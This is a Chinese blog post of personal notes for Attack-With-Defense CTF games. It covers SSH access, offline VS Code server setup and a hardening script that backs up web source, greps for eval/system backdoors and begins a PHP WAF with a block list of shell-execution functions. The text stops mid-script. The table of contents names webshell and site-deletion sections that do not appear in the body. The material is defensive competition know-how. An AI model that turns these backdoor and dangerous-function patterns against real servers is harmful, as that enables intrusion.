
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>AWD个人知识库 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A0%E5%9B%BA%E9%98%B6%E6%AE%B5"><span class="toc-number">3.</span> <span class="toc-text">加固阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2ssh%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.1.</span> <span class="toc-text">部署ssh连接</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%83%85%E5%86%B5"><span class="toc-number">3.1.1.</span> <span class="toc-text">常规情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E8%BF%9E%E6%8E%A5vscode"><span class="toc-number">3.1.2.</span> <span class="toc-text">离线连接vscode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%8A%8A%E6%A2%AD%EF%BC%88Error%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">一把梭（Error）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">3.3.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD"><span class="toc-number">3.4.</span> <span class="toc-text">备份</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD"><span class="toc-number">3.4.1.</span> <span class="toc-text">源码备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD"><span class="toc-number">3.4.2.</span> <span class="toc-text">数据库备份</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D-amp-%E6%BA%90%E7%A0%81%E6%9B%B4%E6%96%B0"><span class="toc-number">3.5.</span> <span class="toc-text">恢复&amp;源码更新</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">3.5.1.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java"><span class="toc-number">3.5.2.</span> <span class="toc-text">Java</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E9%A1%B9%E7%9B%AE"><span class="toc-number">3.5.2.1.</span> <span class="toc-text">构建项目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85"><span class="toc-number">3.5.2.2.</span> <span class="toc-text">重新打包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0%E9%9D%B6%E6%9C%BA%E6%BA%90%E7%A0%81"><span class="toc-number">3.5.2.3.</span> <span class="toc-text">更新靶机源码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL"><span class="toc-number">3.5.3.</span> <span class="toc-text">MySQL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%8F%A3%E4%BB%A4"><span class="toc-number">3.6.</span> <span class="toc-text">修改口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%8F%91%E7%8E%B0"><span class="toc-number">3.7.</span> <span class="toc-text">应用发现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%91%E6%8E%A7"><span class="toc-number">4.</span> <span class="toc-text">监控</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%EF%BC%88Failed%EF%BC%89"><span class="toc-number">4.1.</span> <span class="toc-text">日志监控（Failed）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7"><span class="toc-number">4.2.</span> <span class="toc-text">文件监控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7"><span class="toc-number">4.3.</span> <span class="toc-text">php流量监控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7"><span class="toc-number">4.4.</span> <span class="toc-text">Java流量监控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E4%BA%BA%E7%9A%84%E8%BD%AE%E5%AD%90"><span class="toc-number">4.5.</span> <span class="toc-text">前人的轮子</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0"><span class="toc-number">5.</span> <span class="toc-text">伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#404%E9%A1%B5%E9%9D%A2"><span class="toc-number">5.1.</span> <span class="toc-text">404页面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#alias%E6%AC%BA%E9%AA%97"><span class="toc-number">5.2.</span> <span class="toc-text">alias欺骗</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#waf"><span class="toc-number">6.</span> <span class="toc-text">waf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.2.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">6.3.</span> <span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">6.4.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.5.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%89%E6%BB%A1"><span class="toc-number">6.6.</span> <span class="toc-text">拉满</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">7.</span> <span class="toc-text">防御权限维持</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#D%E7%9B%BE-amp-Seay%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">8.</span> <span class="toc-text">D盾&amp;Seay代码审计</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%98%B6%E6%AE%B5"><span class="toc-number">9.</span> <span class="toc-text">攻击阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F"><span class="toc-number">9.1.</span> <span class="toc-text">扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%9B%AE%E6%A0%87%E5%AD%98%E6%B4%BB"><span class="toc-number">9.1.1.</span> <span class="toc-text">探测目标存活</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">9.1.2.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">9.1.3.</span> <span class="toc-text">目录扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-number">9.2.</span> <span class="toc-text">不死马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%86%99%E9%A9%AC"><span class="toc-number">9.2.1.</span> <span class="toc-text">定时任务写马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%94%9F%E6%88%90%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-number">9.2.2.</span> <span class="toc-text">命令生成不死马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E7%94%9F%E6%88%90%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-number">9.2.3.</span> <span class="toc-text">批量生成不死马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%A4%84%E7%90%86"><span class="toc-number">9.2.4.</span> <span class="toc-text">不死马处理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BFshell%E4%BA%86%E4%BA%A4%E4%B8%AAflag%E5%85%88"><span class="toc-number">9.3.</span> <span class="toc-text">拿shell了交个flag先</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E7%95%99%E5%90%8E%E9%97%A8%E6%A8%A1%E5%9D%97"><span class="toc-number">9.3.1.</span> <span class="toc-text">预留后门模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E9%9D%B6%E6%9C%BA%E6%AD%A6%E8%A3%85666%E5%8F%B7%E2%80%94%E2%80%94%E5%88%A0%E7%AB%99%EF%BC%88"><span class="toc-number">9.4.</span> <span class="toc-text">对靶机武装666号——删站（</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E9%98%B2"><span class="toc-number">10.</span> <span class="toc-text">通防</span></a></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>AWD个人知识库</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/3/2
        </span>
        
        <span class="category">
            <a href="/blog/categories/AWD/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                AWD
            </a>
        </span>
        
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">7.5k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">38分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>个人总结的一点东西和脚本</p>
<span id="more"></span>

<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ConlinderFeng/article/details/108897028">https://blog.csdn.net/ConlinderFeng/article/details/108897028</a></p>
<p><a target="_blank" rel="noopener" href="https://natro92.fun/posts/85a783d6/">https://natro92.fun/posts/85a783d6/</a></p>
<p><a target="_blank" rel="noopener" href="https://libestor.top/%e5%ae%89%e6%b4%b52022awd-java%e5%88%86%e6%9e%90/">https://libestor.top/%e5%ae%89%e6%b4%b52022awd-java%e5%88%86%e6%9e%90/</a></p>
<p><a target="_blank" rel="noopener" href="https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/">https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.viewofthai.link/2023/08/04/ciscn2023-%e5%9b%bd%e8%b5%9b-awd-final-wp/">https://www.viewofthai.link/2023/08/04/ciscn2023-%e5%9b%bd%e8%b5%9b-awd-final-wp/</a></p>
<hr>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>两种awd模式：一种是传统awd（bugku的awd），另一种是flag server（NSS的awd）</p>
<ol>
<li>ssh连上靶机（命令行 or vscode or windterm or Xshell 等等），打包备份源码、数据库（可以用 navicat 走 ssh）到本地（如果有）</li>
<li>直接扔源码到d盾里扫，如果自带后门那就删掉，同时准备编写批量后门脚本利用</li>
<li>代码审计，先找文件上传 or 文件包含 or 文件读取的点</li>
<li>前后台账密，是否有可以直接利用的点</li>
</ol>
<hr>
<h1 id="加固阶段"><a href="#加固阶段" class="headerlink" title="加固阶段"></a>加固阶段</h1><h2 id="部署ssh连接"><a href="#部署ssh连接" class="headerlink" title="部署ssh连接"></a>部署ssh连接</h2><h3 id="常规情况"><a href="#常规情况" class="headerlink" title="常规情况"></a>常规情况</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> glzjin@127.0.0.1:22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h3 id="离线连接vscode"><a href="#离线连接vscode" class="headerlink" title="离线连接vscode"></a>离线连接vscode</h3><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/294933020">https://zhuanlan.zhihu.com/p/294933020</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50035676/article/details/139071299">https://blog.csdn.net/weixin_50035676/article/details/139071299</a></p>
<p>在服务器不通外网的情况下（长城杯吃了这个亏），我们的 vscode 连不上自己的靶机</p>
<p><strong>失败的尝试：</strong></p>
<p>这个时候需要采用离线安装的方式手动下载<strong>vscode-server-linux-x64.tar.gz</strong></p>
<p>先在 帮助—关于 这里查看 commit id</p>
<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240425145640597.png" alt="image-20240425145640597"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//update.code.visualstudio.com/commit:e170252f762678dec6ca2cc69aba1570769a5d39/server-linux-x64/stable</span></span>
<span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//update.code.visualstudio.com/commit:f1a4fb101478ce6ec82fe9627c43efbf9e98c813/cli-alpine-x64/stable</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>（注意把:${commit_id}替换成对应的Commit ID）</p>
<p>然后运行下面的命令，建立<code>$HOME/.vscode-server/bin</code>文件夹。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">commit_id</span><span class="token operator">=</span>f1a4fb101478ce6ec82fe9627c43efbf9e98c813
<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> ~/.vscode-server/bin/<span class="token variable">$&#123;commit_id&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后将 vscode-server-linux-x64.tar.gz 上传在服务器上的<code>$HOME/.vscode-server/bin</code>文件夹中，解压</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/.vscode-server/bin
<span class="token function">tar</span> <span class="token parameter variable">-xvzf</span> vscode-server-linux-x64.tar.gz <span class="token parameter variable">-C</span> ~/.vscode-server/bin/<span class="token variable">$&#123;commit_id&#125;</span> <span class="token parameter variable">--strip</span> <span class="token number">1</span>
<span class="token function">touch</span> ~/.vscode-server/bin/<span class="token variable">$&#123;commit_id&#125;</span>/0
<span class="token function">mv</span> vscode-server-linux-x64 e170252f762678dec6ca2cc69aba1570769a5d39 <span class="token comment"># 注意把:$&#123;commit_id&#125;替换成对应的Commit ID</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是线下实际操作的时候发现依旧无法验证</p>
<br>

<p>还有一种办法，提前在虚拟机里面装好，然后打包给靶机</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/.vscode-server/
<span class="token function">tar</span> <span class="token parameter variable">-czvf</span> /tmp/vscode-server.tar.gz *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>解压到内网靶机上</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> ~/.vscode-server
<span class="token function">tar</span> <span class="token parameter variable">-xvzf</span> vscode-server.tar.gz <span class="token parameter variable">-C</span> ~/.vscode-server/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后应该就能正常连接了（</p>
<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20241119113526435.png" alt="image-20241119113526435"></p>
<hr>
<h2 id="一把梭（Error）"><a href="#一把梭（Error）" class="headerlink" title="一把梭（Error）"></a>一把梭（Error）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>

<span class="token assign-left variable">webapp</span><span class="token operator">=</span><span class="token string">"/var/www/html"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"########################################################################################################################################################################################################"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"备份源码..."</span>

<span class="token assign-left variable">target_folder</span><span class="token operator">=</span><span class="token string">"/tmp/web.tar"</span>
<span class="token assign-left variable">source_folders</span><span class="token operator">=</span><span class="token string">"/var/www/html"</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$target_folder</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"目标压缩文件已存在: <span class="token variable">$target_folder</span>"</span>
<span class="token keyword">else</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"执行压缩命令..."</span>
    <span class="token function">tar</span> <span class="token parameter variable">-cvf</span> <span class="token string">"<span class="token variable">$target_folder</span>"</span> <span class="token string">"<span class="token variable">$source_folders</span>"</span>
<span class="token keyword">fi</span>
<span class="token comment">##############################################</span>
<span class="token assign-left variable">exclude_files</span><span class="token operator">=</span><span class="token string">"LICENSE"</span>
<span class="token assign-left variable">exclude</span><span class="token operator">=</span><span class="token string">"*.js *.sh info.txt *.map *.so.* *.so *.tar *.zip"</span>


<span class="token assign-left variable">exclude_dirs</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">for</span> <span class="token for-or-select variable">dir</span> <span class="token keyword">in</span> <span class="token variable">$exclude_files</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
  <span class="token assign-left variable">exclude_dirs</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$exclude_dirs</span> --exclude-dir=<span class="token variable">$dir</span>"</span>
<span class="token keyword">done</span>

<span class="token assign-left variable">exclude_files_arg</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">for</span> <span class="token for-or-select variable">ext</span> <span class="token keyword">in</span> <span class="token variable">$exclude</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
  <span class="token assign-left variable">exclude_files_arg</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$exclude_files_arg</span> --exclude=<span class="token variable">$ext</span>"</span>
<span class="token keyword">done</span>

<span class="token builtin class-name">echo</span> <span class="token string">"查后门..."</span>
<span class="token punctuation">&#123;</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"------疑似预留eval后门------"</span>
  <span class="token function">grep</span> <span class="token parameter variable">-rnw</span> <span class="token string">'.'</span> <span class="token parameter variable">-e</span> <span class="token string">"eval"</span> <span class="token variable">$exclude_dirs</span> <span class="token variable">$exclude_files_arg</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"------疑似预留system后门------"</span>
  <span class="token function">grep</span> <span class="token parameter variable">-rnw</span> <span class="token string">'.'</span> <span class="token parameter variable">-e</span> <span class="token string">"system"</span> <span class="token variable">$exclude_dirs</span> <span class="token variable">$exclude_files_arg</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"------预留poc：------"</span>
  <span class="token function">grep</span> <span class="token parameter variable">-rnw</span> <span class="token string">'.'</span> <span class="token parameter variable">-e</span> <span class="token string">"\<span class="token variable">$poc</span>"</span> <span class="token variable">$exclude_dirs</span> <span class="token variable">$exclude_files_arg</span>
<span class="token punctuation">&#125;</span> <span class="token operator">></span> /tmp/vuln.txt

<span class="token builtin class-name">echo</span>

<span class="token comment">##############################################</span>
<span class="token builtin class-name">echo</span> <span class="token string">"上waf..."</span>
<span class="token assign-left variable">waf</span><span class="token operator">=</span><span class="token string">"&lt;?php
\<span class="token variable">$pattern</span> = <span class="token entity" title="\&quot;">\"</span>/<span class="token entity" title="\b">\b</span>(?:call_user_func|call_user_func_array|array_map|array_filter|ob_start|phpinfo|eval|assert|passthru|pcntl_exec|exec|system|escapeshellcmd|popen|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|ob_start|echo|file_put_contents)<span class="token entity" title="\b">\b</span>/i<span class="token entity" title="\&quot;">\"</span>;

foreach (\<span class="token variable">$_GET</span> as \<span class="token variable">$param</span>) &#123;
    if (preg_match(\<span class="token variable">$pattern</span>, \<span class="token variable">$param</span>) == 1 || strpos(\<span class="token variable">$param</span>, <span class="token entity" title="\&quot;">\"</span>\<span class="token variable"><span class="token variable">`</span><span class="token punctuation">\</span>"<span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        die<span class="token punctuation">(</span><span class="token string">'flag&#123;You shall die!&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

foreach <span class="token punctuation">(</span><span class="token punctuation">\</span>$_POST as <span class="token punctuation">\</span>$param<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
